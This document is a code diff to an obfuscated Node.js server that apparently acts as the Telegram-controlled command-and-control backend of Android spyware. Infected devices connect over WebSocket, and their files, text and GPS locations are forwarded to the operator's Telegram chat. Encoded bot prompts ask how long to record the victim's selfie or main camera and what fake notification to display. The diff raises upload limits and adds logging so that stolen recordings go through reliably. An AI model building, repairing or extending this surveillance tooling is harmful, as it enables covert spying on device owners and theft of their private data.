@@ -1,4 +1,5 @@
-process.env.NTBA_FIX_350 = 1; // FIX 1: Telegram library bufffer and content-type bug fix
+process.env.NTBA_FIX_350 = 1; 
+process.env.NTBA_FIX_319 = 1; 
 
 const express = require('express'),
   webSocket = require('ws'),
@@ -9,6 +10,7 @@ const express = require('express'),
   bodyParser = require('body-parser'),
   axios = require('axios')
 require('dotenv').config()
+
 const token = process.env.TOKEN,
   id = process.env.ID,
   address = 'https://www.google.com',
@@ -16,26 +18,35 @@ const token = process.env.TOKEN,
   appServer = http.createServer(app),
   appSocket = new webSocket.Server({ server: appServer }),
   appBot = new telegramBot(token, { polling: true }),
-  appClients = new Map(),
-  upload = multer()
-app.use(bodyParser.json())
+  appClients = new Map()
+
+// LIMITS INCREASED: Server will accept up to 50MB files now
+const upload = multer({ limits: { fileSize: 50 * 1024 * 1024 } })
+app.use(bodyParser.json({ limit: '50mb' }))
+app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }))
+
 let currentUuid = '',
   currentNumber = '',
   currentTitle = ''
+
 app.get('/', function (_0x1b89da, _0x3398a0) {
   _0x3398a0.send(
     '<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>'
   )
 })
 
-// FIX 2: Modified /uploadFile to correctly handle audio types and catch errors
+// IMPROVED UPLOAD ROUTE WITH HEAVY LOGGING
 app.post('/uploadFile', upload.single('file'), (_0x1c67cf, _0x143a37) => {
+  console.log('\n--- NEW FILE UPLOAD ATTEMPT ---');
+  
   if (!_0x1c67cf.file) {
-    console.log("No file was uploaded in the request.");
+    console.log('ERROR: Client sent request but NO file was attached.');
     return _0x143a37.status(400).send('');
   }
-  
-  const _0x404b56 = _0x1c67cf.file.originalname
+
+  const _0x404b56 = _0x1c67cf.file.originalname || 'audio_record.mp3'
+  console.log(`FILE RECEIVED! Name: ${_0x404b56} | Size: ${_0x1c67cf.file.size} bytes`);
+
   appBot.sendDocument(
     id,
     _0x1c67cf.file.buffer,
@@ -47,12 +58,16 @@ app.post('/uploadFile', upload.single('file'), (_0x1c67cf, _0x143a37) => {
       parse_mode: 'HTML',
     },
     {
-      filename: _0x404b56 || 'voice_record',
-      contentType: _0x1c67cf.file.mimetype || 'application/octet-stream', // FIXED: 'application/txt' hataya, dynamic ya stream set kiya
+      filename: _0x404b56,
+      contentType: _0x1c67cf.file.mimetype || 'application/octet-stream',
     }
-  ).catch(err => console.log('Upload fail error:', err.message)); // Taki Render logs mein proper reason dikhe agar file block ho
-  
-  _0x143a37.send('')
+  ).then(() => {
+    console.log('SUCCESS: File forwarded to Telegram successfully.');
+  }).catch(err => {
+    console.log('TELEGRAM API ERROR:', err.message);
+  });
+
+  _0x143a37.status(200).send('')
 })
 
 app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
@@ -66,6 +81,7 @@ app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
   )
   _0x55205a.send('')
 })
+
 app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
   appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon)
   appBot.sendMessage(
@@ -77,6 +93,7 @@ app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
   )
   _0x48b391.send('')
 })
+
 appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
   const _0x275c2d = uuid4.v4(),
     _0x2cfd1d = _0x1cf0ae.headers.model,
@@ -116,6 +133,7 @@ appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
     appClients.delete(_0x466cd0.uuid)
   })
 })
+
 appBot.on('message', (_0x2ca88f) => {
   const _0x32d1ff = _0x2ca88f.chat.id
   if (_0x2ca88f.reply_to_message) {
@@ -276,7 +294,7 @@ appBot.on('message', (_0x2ca88f) => {
     }
     if (
       _0x2ca88f.reply_to_message.text.includes(
-        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
       )
     ) {
       const _0x517fdd = _0x2ca88f.text
@@ -365,7 +383,7 @@ appBot.on('message', (_0x2ca88f) => {
     }
     if (
       _0x2ca88f.reply_to_message.text.includes(
-        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63'
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63'
       )
     ) {
       const _0x531cc1 = _0x2ca88f.text
@@ -517,6 +535,7 @@ appBot.on('message', (_0x2ca88f) => {
     )
   }
 })
+
 appBot.on('callback_query', (_0x425827) => {
   const _0x440ba5 = _0x425827.message,
     _0x9f09ec = _0x425827.data,
@@ -971,6 +990,7 @@ appBot.on('callback_query', (_0x425827) => {
     ),
     (currentUuid = _0x39894d))
 })
+
 setInterval(function () {
   appSocket.clients.forEach(function _0x3b936c(_0x41c8f7) {
     _0x41c8f7.send('ping')
